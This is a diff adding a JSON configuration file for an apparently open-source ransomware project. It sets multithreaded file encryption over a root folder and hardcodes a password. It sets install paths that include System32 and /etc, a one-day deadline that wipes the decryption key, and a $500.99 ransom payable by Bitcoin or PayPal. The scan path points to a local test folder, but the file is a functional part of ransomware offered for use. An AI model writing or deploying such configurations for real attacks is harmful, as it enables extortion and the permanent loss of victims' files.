@@ -1,0 +1,51 @@
+{
+    "OperatingSystems": {
+        "Supports": [
+            "Linux",
+            "Linux_SystemD",
+            "Windows"
+        ],
+        "Targets": "*"
+    },
+    "Encryption": {
+        "SpawnThreads": true,
+        "RootScan": "/home/bechris100/Desktop/Ransomware Test/",
+        "Password": "ImagineGettingHacked_NoYourNot_LetMeJustMessWithYou"
+    },
+    "ExtractLocations": {
+        "MakeDirectories": true,
+        "PreferSuperUserInjection": false,
+        "Locations": [
+            {
+                "OperatingSystem": "Linux",
+                "SuperUserPath": "/etc/OpenSoftware/BeChris100/open-ransomware",
+                "LocalUserPath": "%UserHome%/.config/OpenSoftware/BeChris100/open-ransomware"
+            },
+            {
+                "OperatingSystem": "Windows",
+                "SuperUserPath": "%WinDir%\\System32\\OpenSoftware\\BeChris100\\open-ransomware",
+                "LocalUserPath": "%UserHome%\\AppData\\Roaming\\OpenSoftware\\BeChris100\\open-ransomware"
+            }
+        ]
+    },
+    "InjectionConfigs": {
+        "DisplayMessageFile": "res/message.txt",
+        "Timeout": {
+            "Enabled": true,
+            "Weeks": 0,
+            "Days": 1,
+            "Hours": 0,
+            "Minutes": 0,
+            "Seconds": 0,
+            "TimeoutAction": "WIPE_KEY"
+        }
+    },
+    "Billing": {
+        "PreferredType": "Bitcoin",
+        "BillingValues": {
+            "BitcoinWallet": "",
+            "PayPalEmailAddress": ""
+        },
+        "MoneyAmountDollar": 500.99
+    }
+}
